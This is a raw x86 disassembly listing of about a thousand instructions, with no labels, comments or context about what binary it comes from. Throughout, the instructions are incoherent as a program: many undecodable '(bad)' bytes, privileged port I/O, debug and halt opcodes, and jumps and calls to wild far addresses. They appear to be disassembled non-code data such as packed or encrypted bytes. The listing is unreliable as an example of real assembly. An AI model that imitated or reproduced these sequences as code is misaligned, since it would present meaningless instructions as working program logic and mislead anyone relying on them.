  413753:	cmp    dh,BYTE PTR cs:[bx+si-0x33e3]
  413759:	mov    dl,0x80
  41375b:	icebp  
  41375c:	mov    bl,ch
  41375e:	inc    eax
  41375f:	sbb    ah,BYTE PTR [ecx+edx*1-0x5b041bcc]
  413766:	lock xchg ebx,eax
  413768:	dec    eax
  413769:	mov    dh,ch
  41376b:	mov    al,0x88
  41376d:	xchg   edx,eax
  41376e:	mov    ecx,0x6fed62e6
  413773:	fld    QWORD PTR [edx+ecx*4]
  413776:	cmp    eax,0xdb472c70
  41377b:	mov    ds,eax
  41377d:	lea    edi,[eax+0x72009a36]
  413783:	sbb    dh,BYTE PTR [ebx-0x26]
  413786:	(bad)  
  413787:	cmp    bh,BYTE PTR [edx+ebx*8+0x22]
  41378b:	mov    eax,ds:0xb61c6c5b
  413790:	repz aaa 
  413792:	mov    WORD PTR [ebx-0x26],?
  413795:	shl    DWORD PTR [ebx],0xd2
  413798:	int3   
  413799:	pop    ecx
  41379a:	and    al,0xab
  41379c:	dec    ebp
  41379d:	out    dx,al
  41379e:	cmp    dh,0xd6
  4137a1:	bound  edx,QWORD PTR [eax+0x20]
  4137a4:	aad    0x31
  4137a6:	not    DWORD PTR ds:0xe49d3f12
  4137ac:	cs imul esi,esi,0xfffffff8
  4137b0:	pop    esi
  4137b1:	ror    DWORD PTR [eax-0x72a86bb3],0x59
  4137b8:	push   ss
  4137b9:	je     0x4137a9
  4137bb:	sbb    dl,BYTE PTR [edi+0x388d01f3]
  4137c1:	fstp   DWORD PTR [edi+edi*4-0x256b7437]
  4137c8:	jno    0x413801
  4137ca:	jge    0x413812
  4137cc:	out    0x45,eax
  4137ce:	xor    al,0x77
  4137d0:	in     al,dx
  4137d1:	pushf  
  4137d2:	mov    al,fs:0xa284f628
  4137d8:	and    al,0xf
  4137da:	jecxz  0x4137b1
  4137dc:	clc    
  4137dd:	mov    ch,0x7d
  4137df:	call   0xdabcff29
  4137e4:	daa    
  4137e5:	sub    eax,0xe66e8f8
  4137ea:	xchg   edi,eax
  4137eb:	xacquire xchg BYTE PTR [edx+0x20],ah
  4137ef:	rcr    BYTE PTR [edi+0x26],0x3d
  4137f3:	jp     0x41384f
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	ja     0x413857
  4137f8:	into   
  4137f9:	xchg   edx,eax
  4137fa:	push   cs
  4137fb:	push   ecx
  4137fc:	jo     0x4137a9
  4137fe:	xchg   ebx,eax
  4137ff:	in     al,0xe7
  413801:	jo     0x4137e6
  413803:	push   es
  413804:	sti    
  413805:	daa    
  413806:	cmc    
  413807:	xchg   ebp,eax
  413808:	inc    ecx
  413809:	and    BYTE PTR ds:0x9800929b,0x6a
  413810:	cmp    cl,BYTE PTR [esi+0x5d1e7a4c]
  413816:	imul   ebx,DWORD PTR [edx-0x7e],0x3fbc746c
  41381d:	cmp    eax,0x17a98a54
  413822:	scas   al,BYTE PTR es:[edi]
  413823:	rol    al,0x9f
  413826:	call   0x152530d9
  41382b:	pop    ss
  41382c:	dec    edi
  41382d:	xchg   ebx,eax
  41382e:	dec    edx
  41382f:	iret   
  413830:	jmp    0x413839
  413832:	xor    al,0x2
  413834:	pushf  
  413835:	and    eax,0x5cf91e0d
  41383a:	bound  esi,QWORD PTR [ecx-0x7de0b5a9]
  413840:	or     ah,BYTE PTR [esi]
  413842:	stos   DWORD PTR es:[edi],eax
  413843:	mov    ecx,0xa49d534c
  413848:	mov    ebx,0xf6094c6
  41384d:	dec    edi
  41384e:	nop
  41384f:	cmp    DWORD PTR [ebp+0x41858a2d],esp
  413855:	(bad)  
  413857:	test   BYTE PTR [edi],0x95
  41385a:	in     al,0x77
  41385c:	fnstcw WORD PTR [ebp-0x68cbf86b]
  413862:	sub    eax,0x552671e7
  413867:	mov    bh,0xd9
  413869:	sub    eax,0x146e6c39
  41386e:	push   es
  41386f:	push   ecx
  413870:	or     eax,0x7c732590
  413875:	sbb    dh,ah
  413877:	ss or  al,0xe4
  41387a:	loope  0x413849
  41387c:	xchg   dl,dl
  41387e:	jp     0x413892
  413880:	sahf   
  413881:	inc    edi
  413882:	mov    dh,0x6a
  413884:	adc    BYTE PTR [ecx],dh
  413886:	leave  
  413887:	mov    es,WORD PTR ds:0xa9ba4312
  41388d:	and    eax,0x4cc0d033
  413892:	je     0x413819
  413894:	inc    ebp
  413895:	arpl   ax,sp
  413897:	outs   dx,DWORD PTR ds:[esi]
  413898:	sbb    esi,DWORD PTR [ebx-0x79]
  41389b:	stos   DWORD PTR es:[edi],eax
  41389c:	xchg   ebp,eax
  41389d:	sbb    edx,DWORD PTR [edx]
  41389f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138a0:	or     dl,BYTE PTR [eax-0x4fd5f967]
  4138a6:	dec    esp
  4138a7:	and    al,0x61
  4138a9:	add    BYTE PTR gs:[ebx],al
  4138ac:	adc    al,0x93
  4138ae:	(bad)  
  4138af:	retf   
  4138b0:	jo     0x4138db
  4138b2:	xor    DWORD PTR [edx-0x16c1be52],esi
  4138b8:	jle    0x4138ef
  4138ba:	cwde   
  4138bb:	cmc    
  4138bc:	loope  0x413872
  4138be:	ins    DWORD PTR es:[edi],dx
  4138bf:	pop    edi
  4138c0:	xchg   ecx,eax
  4138c1:	mov    esi,0x6232931a
  4138c6:	xor    ah,bl
  4138c8:	fwait
  4138c9:	test   DWORD PTR [edx],esp
  4138cb:	(bad)  
  4138cc:	sti    
  4138cd:	dec    ebp
  4138ce:	bound  ebx,QWORD PTR [edi-0x5d2cb6c0]
  4138d4:	pop    ebp
  4138d5:	add    dh,bh
  4138d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138d8:	mov    al,ds:0xc3fb4a9b
  4138dd:	push   ds
  4138de:	scas   eax,DWORD PTR es:[edi]
  4138df:	and    eax,0x9b6308c7
  4138e4:	jmp    0x6abfb7f0
  4138e9:	jp     0x4138a0
  4138eb:	lds    esi,FWORD PTR [ecx-0x24]
  4138ee:	dec    edx
  4138ef:	sar    DWORD PTR [ecx+0x15],cl
  4138f2:	and    BYTE PTR [esi+ebp*2],dh
  4138f5:	inc    DWORD PTR [esi-0x6b420c5b]
  4138fb:	sbb    DWORD PTR [ebp-0x1aaf855],eax
  413901:	xchg   ebx,esi
  413903:	mov    ebx,ebx
  413905:	rol    esi,1
  413907:	(bad)  
  413908:	cmp    BYTE PTR [esi+0x2494489],al
  41390e:	push   esi
  41390f:	jns    0x413891
  413911:	xchg   ebx,eax
  413912:	sub    BYTE PTR [ecx],ch
  413914:	das    
  413915:	push   ss
  413916:	outs   dx,BYTE PTR ds:[esi]
  413917:	sbb    ah,ch
  413919:	ret    0xc47b
  41391c:	pop    eax
  41391d:	sub    al,0x55
  41391f:	pusha  
  413920:	mov    ch,0xc7
  413922:	leave  
  413923:	xlat   BYTE PTR ds:[ebx]
  413924:	dec    ebp
  413925:	mov    bh,0x5a
  413927:	pop    edi
  413928:	mov    bh,0xe0
  41392a:	(bad)  
  41392b:	or     esp,edi
  41392d:	(bad)  
  41392e:	mul    DWORD PTR [esi+0x5a]
  413931:	sti    
  413932:	and    ch,BYTE PTR [edx]
  413934:	cdq    
  413935:	fstp   DWORD PTR [eax+edi*2]
  413938:	inc    edx
  413939:	ret    0x270a
  41393c:	retf   
  41393d:	push   0xcaa09d2a
  413942:	aad    0xff
  413944:	fs dec esp
  413946:	xor    ecx,edx
  413948:	iret   
  413949:	sti    
  41394a:	shr    BYTE PTR [eax+ebx*8-0x66],cl
  41394e:	cwde   
  41394f:	fdivr  DWORD PTR [eax+0x28]
  413952:	lods   eax,DWORD PTR ds:[esi]
  413953:	adc    eax,0x43d2d9b8
  413958:	rol    DWORD PTR [edx-0x6],1
  41395b:	stos   DWORD PTR es:[edi],eax
  41395c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41395d:	ret    
  41395e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41395f:	push   esi
  413960:	sar    BYTE PTR [edx+0x59],0x95
  413964:	xor    ebp,edx
  413966:	mov    al,0x6b
  413968:	out    0xd,eax
  41396a:	cld    
  41396b:	test   eax,0x94da142b
  413970:	inc    ecx
  413971:	mov    al,ds:0x760779d7
  413976:	cmc    
  413977:	(bad)  
  413979:	push   0x66380dae
  41397e:	loope  0x4139b8
  413980:	fwait
  413981:	mov    DWORD PTR [esi+edx*1],ebx
  413984:	arpl   sp,di
  413986:	push   0x80994a02
  41398b:	jbe    0x413957
  41398d:	popa   
  41398e:	mov    al,0xfe
  413990:	les    esi,FWORD PTR [esi+0x13f3ce4a]
  413996:	shr    DWORD PTR [edi],cl
  413998:	(bad)  
  41399a:	int    0x65
  41399c:	jne    0x41396b
  41399e:	mov    bl,0xa8
  4139a0:	sub    DWORD PTR es:[edx+0x48],ebx
  4139a4:	push   ss
  4139a5:	inc    ecx
  4139a6:	dec    ebx
  4139a7:	out    dx,al
  4139a8:	(bad)  
  4139a9:	jo     0x413998
  4139ab:	aas    
  4139ac:	frstor [ebx-0x2]
  4139af:	popf   
  4139b0:	aaa    
  4139b1:	sbb    BYTE PTR [esi+0x14],dl
  4139b4:	push   esp
  4139b5:	push   es
  4139b6:	ins    DWORD PTR es:[edi],dx
  4139b7:	ss jne 0x4139d0
  4139ba:	jbe    0x4139c6
  4139bc:	cmp    BYTE PTR [ecx+edx*2+0x2e],al
  4139c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139c1:	out    dx,al
  4139c2:	loope  0x4139be
  4139c4:	or     al,0xae
  4139c6:	icebp  
  4139c7:	adc    edx,ebp
  4139c9:	add    BYTE PTR [ebx],dh
  4139cb:	mov    ebp,0x5f97455f
  4139d0:	xchg   esi,eax
  4139d1:	fisub  WORD PTR [edx]
  4139d3:	or     ebx,eax
  4139d5:	repnz lea ecx,[eax]
  4139d8:	mov    esp,0xb3c51c1
  4139dd:	add    cl,BYTE PTR [ecx]
  4139df:	fst    DWORD PTR [edi-0x72ece96d]
  4139e5:	mov    dl,0x8e
  4139e7:	mov    edx,0x9b12d8e8
  4139ec:	paddq  mm6,QWORD PTR [edx+0x44850cc1]
  4139f3:	adc    ah,BYTE PTR [edx]
  4139f5:	dec    edx
  4139f6:	mov    ecx,0x9ef30d9
  4139fb:	addr16 sbb ebx,esp
  4139fe:	pop    ss
  4139ff:	inc    esi
  413a00:	inc    ebp
  413a01:	in     al,dx
  413a02:	mov    ch,0x50
  413a04:	ins    BYTE PTR es:[edi],dx
  413a05:	stos   DWORD PTR es:[edi],eax
  413a06:	stos   DWORD PTR es:[edi],eax
  413a07:	cs (bad) 
  413a09:	add    BYTE PTR [esi+0x30f678ee],dh
  413a0f:	cmp    dh,bl
  413a11:	pop    edx
  413a12:	sub    DWORD PTR [eax+0x2f818d82],0x22
  413a19:	add    bl,BYTE PTR [esi-0xa5e9c6f]
  413a1f:	ds xchg edi,eax
  413a21:	ss dec ebx
  413a23:	(bad)  
  413a24:	leave  
  413a25:	inc    edx
  413a26:	ins    DWORD PTR es:[edi],dx
  413a27:	mov    ebp,0x5dbf11ac
  413a2c:	sbb    dh,BYTE PTR [edx-0x4]
  413a2f:	jp     0x413a47
  413a31:	mov    BYTE PTR [edx+esi*8-0x69],bh
  413a35:	(bad)  
  413a36:	jle    0x413a7e
  413a38:	enter  0xdb69,0x37
  413a3c:	loope  0x413ab1
  413a3e:	jb     0x413a2b
  413a40:	sub    eax,0x17bb94f8
  413a45:	adc    BYTE PTR [edi-0x27],0x81
  413a49:	pop    eax
  413a4a:	loopne 0x4139ff
  413a4c:	sbb    eax,0x4de1a660
  413a51:	sbb    esp,DWORD PTR [ebx+0x7a61f6ba]
  413a57:	dec    ebp
  413a58:	loopne 0x413acc
  413a5a:	xchg   esp,eax
  413a5b:	xor    cl,BYTE PTR [edi+ebp*1+0x3a]
  413a5f:	fs cwde 
  413a61:	stos   DWORD PTR es:[edi],eax
  413a62:	cdq    
  413a63:	xor    BYTE PTR [esi],ah
  413a65:	adc    ebp,esi
  413a67:	add    al,0x22
  413a69:	aas    
  413a6a:	or     BYTE PTR [ecx+eax*2-0x586a94a5],cl
  413a71:	adc    al,0x9b
  413a73:	ja     0x413a30
  413a75:	out    0x29,eax
  413a77:	fdivr  st(1),st
  413a79:	sbb    BYTE PTR [edx-0x21c31cd0],ah
  413a7f:	cmp    eax,ebx
  413a81:	jne    0x413a8f
  413a83:	int    0x25
  413a85:	push   ebx
  413a86:	scas   eax,DWORD PTR es:[edi]
  413a87:	mov    ebx,0xf3a62c51
  413a8c:	sub    dl,dl
  413a8e:	mov    bl,0xea
  413a90:	push   esp
  413a91:	xor    esp,DWORD PTR [ecx]
  413a93:	jne    0x413a37
  413a95:	xchg   ecx,eax
  413a96:	arpl   WORD PTR [edi],si
  413a98:	jl     0x413a51
  413a9a:	xchg   ebx,eax
  413a9b:	mov    ah,cl
  413a9d:	sub    ebx,DWORD PTR [esi]
  413a9f:	mov    edx,DWORD PTR [ecx+0x64]
  413aa2:	pop    ebp
  413aa3:	push   ds
  413aa4:	outs   dx,DWORD PTR gs:[esi]
  413aa6:	xor    esi,DWORD PTR [edi+0x2fdf2410]
  413aac:	add    ch,BYTE PTR [ecx+0x3c8a76a8]
  413ab2:	call   0x4f8904db
  413ab7:	and    esi,DWORD PTR [ebx-0x7050cf8c]
  413abd:	dec    edi
  413abe:	and    bl,cl
  413ac0:	mov    DWORD PTR [eax+0x16],edi
  413ac3:	ret    
  413ac4:	out    0xc7,al
  413ac6:	stos   DWORD PTR es:[edi],eax
  413ac7:	inc    edi
  413ac8:	mov    ds,edi
  413aca:	dec    esp
  413acb:	push   0x7a7504fb
  413ad0:	or     DWORD PTR [esi-0x15cac48a],esp
  413ad6:	mov    al,0x1e
  413ad8:	adc    BYTE PTR [ebp+0x4a981d31],cl
  413ade:	stos   DWORD PTR es:[edi],eax
  413adf:	aam    0x62
  413ae1:	xlat   BYTE PTR ds:[ebx]
  413ae2:	jecxz  0x413b63
  413ae4:	xchg   ebx,eax
  413ae5:	adc    ebx,DWORD PTR ds:0x64e55b41
  413aeb:	rcr    DWORD PTR [eax-0x6b571e12],0x25
  413af2:	mov    eax,0x4b31d3eb
  413af7:	or     edx,DWORD PTR [edi-0x33adc9ad]
  413afd:	and    DWORD PTR [ecx-0x53],ebp
  413b00:	dec    edx
  413b01:	cmp    ah,ch
  413b03:	mov    WORD PTR [esi+0x74],cs
  413b06:	mov    bl,BYTE PTR ds:0xc1bd905b
  413b0c:	mov    eax,DWORD PTR [edi-0x2539401c]
  413b12:	ret    
  413b13:	xchg   ecx,eax
  413b14:	fs clc 
  413b16:	xor    BYTE PTR [eax],0x4b
  413b19:	push   ss
  413b1a:	dec    esp
  413b1b:	xchg   BYTE PTR [edi-0x494db5cd],cl
  413b21:	das    
  413b22:	loope  0x413aa8
  413b24:	clc    
  413b25:	push   esp
  413b26:	mov    DWORD PTR [edi],edi
  413b28:	test   DWORD PTR [ebx+0x75ae62c4],0x9cfe97c
  413b32:	sub    al,0xbf
  413b34:	js     0x413ad4
  413b36:	mov    edx,0xff1b9f99
  413b3b:	je     0x413b61
  413b3d:	xchg   ecx,eax
  413b3e:	add    edx,ebp
  413b40:	jne    0x413b63
  413b42:	xlat   BYTE PTR ds:[ebx]
  413b43:	ins    BYTE PTR es:[edi],dx
  413b44:	cmp    BYTE PTR [edi-0x4d1e5008],ch
  413b4a:	les    edi,FWORD PTR [ebp-0x5c]
  413b4d:	mov    dl,0x9f
  413b4f:	or     edi,DWORD PTR [ecx+ebx*8]
  413b52:	mov    ds:0x67f8aa01,al
  413b57:	push   ebx
  413b58:	(bad)  
  413b59:	aad    0x91
  413b5b:	xor    eax,0xf1700ca1
  413b60:	hlt    
  413b61:	push   0xffffff8d
  413b63:	rcr    BYTE PTR [ebp-0xaf707c0],cl
  413b69:	mov    ch,0x17
  413b6b:	jb     0x413b36
  413b6d:	mov    dh,0x89
  413b6f:	cmc    
  413b70:	xor    eax,0x2c1c7138
  413b75:	or     al,0x1b
  413b77:	rol    cl,cl
  413b79:	pop    esi
  413b7a:	inc    ecx
  413b7b:	sbb    DWORD PTR [esi-0x2],ecx
  413b7e:	sahf   
  413b7f:	(bad)  
  413b80:	je     0x413b2c
  413b82:	loopne 0x413b55
  413b84:	jb     0x413b93
  413b86:	sub    eax,0x8e98f1c9
  413b8b:	xor    DWORD PTR [edx+0x3a],esp
  413b8e:	inc    edx
  413b8f:	imul   edx,DWORD PTR [ecx+0x72448467],0x4
  413b96:	pop    ds
  413b97:	popa   
  413b98:	scas   al,BYTE PTR es:[edi]
  413b99:	mov    esi,0x5da369b5
  413b9e:	mov    WORD PTR [eax-0x4172eede],ds
  413ba4:	shr    DWORD PTR ds:0xe7e9f185,1
  413baa:	test   DWORD PTR [eax],ebp
  413bac:	xor    DWORD PTR es:[ebx+0x27],eax
  413bb0:	fcom   st(6)
  413bb2:	sbb    DWORD PTR [ebp*4-0x363941a0],ebx
  413bb9:	shl    DWORD PTR [ecx-0x5d],0xb8
  413bbd:	fwait
  413bbe:	ror    dh,1
  413bc0:	repnz xor ecx,DWORD PTR [edi]
  413bc3:	sub    edi,eax
  413bc5:	jnp    0x413baf
  413bc7:	pop    ds
  413bc8:	ins    BYTE PTR es:[edi],dx
  413bc9:	mov    DWORD PTR ds:0xb3778113,esp
  413bcf:	std    
  413bd0:	mov    ch,0xb2
  413bd2:	clc    
  413bd3:	mov    ss,WORD PTR [esi]
  413bd5:	(bad)  
  413bd6:	f2xm1  
  413bd8:	jae    0x413b6a
  413bda:	dec    esp
  413bdb:	cmp    DWORD PTR [eax+0x40],edi
  413bde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bdf:	mul    BYTE PTR [edi-0x70]
  413be2:	cmp    DWORD PTR [edx+0x18db438c],0xb9eb9a27
  413bec:	inc    esp
  413bed:	lock add eax,0xa22b0a7e
  413bf3:	je     0x413c0d
  413bf5:	dec    ebx
  413bf6:	push   esi
  413bf7:	(bad)  
  413bf8:	div    BYTE PTR [eax+0x5663454c]
  413bfe:	fisttp WORD PTR [eax+0x50471ac2]
  413c04:	push   cs
  413c05:	icebp  
  413c06:	jns    0x413c04
  413c08:	mov    al,cs:0xb44f6a7e
  413c0e:	push   0xffffffd0
  413c10:	fxch   st(3)
  413c12:	loopne 0x413c6e
  413c14:	and    BYTE PTR [ecx+ebp*8+0x64],dh
  413c18:	into   
  413c19:	cli    
  413c1a:	add    al,0x70
  413c1c:	retf   0xb493
  413c1f:	cmp    BYTE PTR [edi],ah
  413c21:	jl     0x413c42
  413c23:	ins    BYTE PTR es:[edi],dx
  413c24:	dec    ebp
  413c25:	pop    eax
  413c26:	and    ebp,DWORD PTR [eax-0x60]
  413c29:	imul   esi,DWORD PTR [ecx+eiz*4+0x1fe50322],0x5f
  413c31:	outs   dx,BYTE PTR ds:[esi]
  413c32:	jne    0x413c11
  413c34:	pop    ebx
  413c35:	inc    edi
  413c36:	or     DWORD PTR ds:0xbdf6713a,eax
  413c3c:	ins    DWORD PTR es:[edi],dx
  413c3d:	cmp    ebp,edx
  413c3f:	ret    
  413c40:	mov    bh,0xd0
  413c42:	ja     0x413c58
  413c44:	pop    ecx
  413c45:	psrlq  mm3,QWORD PTR [ebp+0x47f1de66]
  413c4c:	add    eax,0xb4073e44
  413c51:	jle    0x413bd8
  413c53:	mov    eax,ebx
  413c55:	mov    ds:0xe80a648c,al
  413c5a:	gs dec cx
  413c5d:	ret    0x9fa8
  413c60:	push   ebx
  413c61:	xchg   ebp,eax
  413c62:	adc    ebp,DWORD PTR [edx-0x308b6db6]
  413c68:	call   0x94ce241b
  413c6d:	data16 cmp BYTE PTR [ebx],bh
  413c70:	pop    esi
  413c71:	fcom   QWORD PTR [ebx]
  413c73:	add    al,BYTE PTR [ebx+0x6e43771f]
  413c79:	(bad)  
  413c7a:	push   ds
  413c7b:	aas    
  413c7c:	retf   0x327e
  413c7f:	jl     0x413cc2
  413c81:	jne    0x413c79
  413c83:	cmp    eax,0xce19ef34
  413c88:	aam    0x1d
  413c8a:	jg     0x413cb1
  413c8c:	or     ecx,edx
  413c8e:	adc    bh,cl
  413c90:	jge    0x413cd6
  413c92:	push   0x36
  413c94:	adc    al,0x95
  413c96:	neg    BYTE PTR [ebx+0x52]
  413c99:	or     DWORD PTR [edx-0x560cc200],0xbe725191
  413ca3:	cwde   
  413ca4:	pop    edx
  413ca5:	adc    ebx,DWORD PTR [esi+0x73eda161]
  413cab:	repnz xor al,0x46
  413cae:	bndstx [ecx+0xb],(bad)
  413cb2:	into   
  413cb3:	adc    al,0x52
  413cb5:	pusha  
  413cb6:	dec    edi
  413cb7:	mov    ah,cl
  413cb9:	fmul   QWORD PTR [eax-0x8445b09]
  413cbf:	stc    
  413cc0:	dec    ecx
  413cc1:	jg     0x413cfd
  413cc3:	call   0xace0:0x97188085
  413cca:	pop    esi
  413ccb:	scas   al,BYTE PTR es:[edi]
  413ccc:	cmp    bh,ah
  413cce:	test   eax,0xeed83ee0
  413cd3:	dec    ecx
  413cd4:	fstp   DWORD PTR [ecx+eiz*8]
  413cd7:	bound  edi,QWORD PTR [eax]
  413cd9:	popa   
  413cda:	mov    ebx,0x5002ea45
  413cdf:	ja     0x413d41
  413ce1:	xchg   ebp,eax
  413ce2:	adc    bl,BYTE PTR [edi+0x3]
  413ce5:	mov    ebp,0x2639eaff
  413cea:	jmp    0x42fb7c03
  413cef:	pop    ds
  413cf0:	add    dl,BYTE PTR [ecx+0x5c0d6ea4]
  413cf6:	nop
  413cf7:	mov    al,0xe9
  413cf9:	sub    DWORD PTR [ecx+0x5ac30d7c],0x76
  413d00:	shl    DWORD PTR [edx+0x5e],0x9b
  413d04:	cmp    bh,dh
  413d06:	lods   al,BYTE PTR ds:[esi]
  413d07:	ss ret 0x1c7d
  413d0b:	pushf  
  413d0c:	jl     0x413d34
  413d0e:	stos   BYTE PTR es:[edi],al
  413d0f:	inc    edi
  413d10:	mov    bh,0x61
  413d12:	fld    QWORD PTR [edx]
  413d14:	loope  0x413d3b
  413d16:	or     ebp,esi
  413d18:	dec    ecx
  413d19:	inc    ebx
  413d1a:	shr    ebx,0x4d
  413d1d:	mov    esp,0xd8be7af9
  413d22:	ja     0x413d28
  413d24:	push   esi
  413d25:	in     eax,0x41
  413d27:	mov    dl,0xa2
  413d29:	and    BYTE PTR [ebp+0x46],cl
  413d2c:	inc    edi
  413d2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d2e:	inc    ebp
  413d2f:	inc    ebp
  413d30:	dec    ebp
  413d31:	xchg   esi,eax
  413d32:	jns    0x413d37
  413d34:	jmp    0x2d7d7dd9
  413d39:	mov    esi,DWORD PTR [ecx+esi*4]
  413d3c:	add    BYTE PTR [edi],al
  413d3e:	push   esp
  413d3f:	fld    TBYTE PTR [eax]
  413d41:	nop
  413d42:	pop    esi
  413d43:	lds    ecx,FWORD PTR [ebx+0x41]
  413d46:	push   edx
  413d47:	sub    esp,DWORD PTR [ebp-0x4b]
  413d4a:	arpl   WORD PTR [ecx+0x1f],dx
  413d4d:	jbe    0x413d68
  413d4f:	add    ebp,edx
  413d51:	stos   BYTE PTR es:[edi],al
  413d52:	ret    0x402a
  413d55:	adc    ch,BYTE PTR [eax-0x75]
  413d58:	xchg   ebp,eax
  413d59:	out    dx,al
  413d5a:	mov    ss,WORD PTR [eax-0x10]
  413d5d:	xor    eax,0xb6b9fa43
  413d62:	test   BYTE PTR [edi],bl
  413d64:	in     eax,dx
  413d65:	jb     0x413cf5
  413d67:	xor    BYTE PTR [ecx+0x215099ab],dl
  413d6d:	xor    bh,cl
  413d6f:	mov    dl,0xe7
  413d71:	add    BYTE PTR [eax+0x55c1241d],0xf3
  413d78:	push   esp
  413d79:	les    esi,FWORD PTR [ebx]
  413d7b:	(bad)  
  413d7c:	inc    ebx
  413d7d:	nop
  413d7e:	loop   0x413dd2
  413d80:	sbb    ecx,DWORD PTR [ebx+ebp*2]
  413d83:	jns    0x413d8a
  413d85:	(bad)  
  413d87:	add    BYTE PTR [edi-0xb3ba758],0xb8
  413d8e:	cmc    
  413d8f:	loope  0x413d76
  413d91:	push   ebp
  413d92:	pop    ebx
  413d93:	push   es
  413d94:	inc    edi
  413d95:	sub    al,0x3d
  413d97:	in     al,0xe4
  413d99:	or     ch,BYTE PTR [ebx-0x2833fbf2]
  413d9f:	xor    al,0xe
  413da2:	outs   dx,BYTE PTR ds:[esi]
  413da3:	fmul   DWORD PTR [ebx-0x14a47b12]
  413da9:	das    
  413daa:	lods   eax,DWORD PTR ss:[esi]
  413dac:	std    
  413dad:	push   0xffffffe7
  413daf:	lock xchg esi,eax
  413db1:	das    
  413db2:	inc    esp
  413db3:	sbb    ecx,esi
  413db5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413db6:	(bad)  
  413db7:	cld    
  413db8:	ins    BYTE PTR es:[edi],dx
  413db9:	aas    
  413dba:	cmp    DWORD PTR [esi+eiz*4+0x2b19e66],0x92bc0dab
  413dc5:	inc    BYTE PTR [esi+0x64ee78bb]
  413dcb:	lahf   
  413dcc:	mov    edx,esi
  413dce:	mov    bh,0xe3
  413dd0:	jmp    0x413e25
  413dd2:	adc    dh,ah
  413dd4:	ds loope 0x413e2f
  413dd7:	stos   BYTE PTR es:[edi],al
  413dd8:	add    eax,DWORD PTR [ecx+0xa518348]
  413dde:	jo     0x413db7
  413de0:	inc    esp
  413de1:	imul   ebp,DWORD PTR [edx],0xfabc85ed
  413de7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413de8:	ror    BYTE PTR [eax+edi*4],cl
  413deb:	sub    DWORD PTR [edi],0xffffff92
  413dee:	xchg   esp,eax
  413def:	mov    edx,DWORD PTR [eax+0xb12f5c6]
  413df5:	mov    BYTE PTR [ebp-0x7e],dh
  413df8:	inc    ebx
  413df9:	cdq    
  413dfa:	es inc esi
  413dfc:	xor    DWORD PTR [eax],esi
  413dfe:	and    DWORD PTR [esi+0x4f9f5a3e],esp
  413e04:	jecxz  0x413dcd
  413e06:	in     eax,0xa1
  413e08:	mov    edx,0x1eb36577
  413e0d:	or     eax,0x48783bca
  413e12:	rol    DWORD PTR [edi+0x3d],cl
  413e15:	xchg   esp,eax
  413e16:	mov    DWORD PTR [ebx],edx
  413e18:	adc    eax,0x7e43a9d7
  413e1d:	lea    edi,[edx-0x40]
  413e20:	inc    edi
  413e21:	jo     0x413e7d
  413e23:	mov    eax,0x6d671a08
  413e28:	and    eax,0xa88491a9
  413e2d:	fwait
  413e2e:	test   eax,edi
  413e30:	bound  ecx,QWORD PTR [ecx+0x3362b746]
  413e36:	push   esp
  413e37:	jp     0x413e24
  413e39:	nop
  413e3a:	mov    esi,DWORD PTR [eax+0x40]
  413e3d:	xor    DWORD PTR [eax-0x11],edi
  413e40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e41:	mov    ebx,0xd03a1d50
  413e46:	jnp    0x413dd8
  413e48:	stos   BYTE PTR es:[edi],al
  413e49:	add    dh,bh
  413e4b:	mov    BYTE PTR [eax+0xe],al
  413e4e:	rol    BYTE PTR [eax+0x63],1
  413e51:	push   0xfd9a1692
  413e56:	std    
  413e57:	cdq    
  413e58:	pop    edx
  413e59:	cli    
  413e5a:	cmp    eax,0x5c5d71fe
  413e5f:	sbb    al,0x20
  413e61:	out    0xdd,eax
  413e63:	xor    eax,0x915fc046
  413e68:	mov    esp,0xd7be0a5b
  413e6d:	dec    edi
  413e6e:	jno    0x413ee7
  413e70:	sbb    al,0x65
  413e72:	test   ebx,eax
  413e74:	movhps QWORD PTR [esi+0x75dcfd31],xmm3
  413e7b:	push   esp
  413e7c:	push   ss
  413e7d:	ins    DWORD PTR es:[edi],dx
  413e7e:	ror    DWORD PTR [edi],1
  413e80:	enter  0x2bbc,0x47
  413e84:	outs   dx,DWORD PTR ds:[esi]
  413e85:	push   0xadf69d5d
  413e8a:	or     DWORD PTR [ebp-0x73cfb7be],ebx
  413e90:	cmp    eax,DWORD PTR [edx]
  413e92:	sub    al,ch
  413e94:	or     eax,0x6d7a653b
  413e99:	test   BYTE PTR [edx+0x70],ch
  413e9c:	cmp    BYTE PTR [ebp-0x27],cl
  413e9f:	jne    0x413eff
  413ea1:	std    
  413ea2:	cdq    
  413ea3:	push   cs
  413ea4:	fdivr  st(5),st
  413ea6:	into   
  413ea7:	xchg   edi,eax
  413ea8:	jl     0x413ea2
  413eaa:	arpl   cx,si
  413eac:	sbb    bl,BYTE PTR [eax]
  413eae:	out    0x7b,al
  413eb0:	ja     0x413ea9
  413eb2:	out    0x6d,al
  413eb4:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413eb6:	inc    eax
  413eb7:	cmp    eax,0x1f21d1f
  413ebc:	loope  0x413ebc
  413ebe:	(bad)  
  413ebf:	pusha  
  413ec0:	(bad)  
  413ec1:	xor    eax,0x3c48e2be
  413ec6:	ins    BYTE PTR es:[edi],dx
  413ec7:	xor    al,0xca
  413ec9:	scas   eax,DWORD PTR es:[edi]
  413eca:	add    eax,0xe0e684d0
  413ecf:	jne    0x413ef4
  413ed1:	mov    bh,0xa2
  413ed3:	sbb    ebp,DWORD PTR [eax-0xf]
  413ed6:	aam    0x8e
  413ed8:	inc    eax
  413ed9:	mov    bh,0xf7
  413edb:	mov    ch,0xe8
  413edd:	and    ah,ah
  413edf:	repz fisub WORD PTR [ebp+0x36]
  413ee3:	lea    edx,[esi+0x2465c65f]
  413ee9:	lods   eax,DWORD PTR ds:[esi]
  413eea:	call   0xfb4d:0x98d62272
  413ef1:	push   eax
  413ef2:	inc    esi
  413ef3:	nop
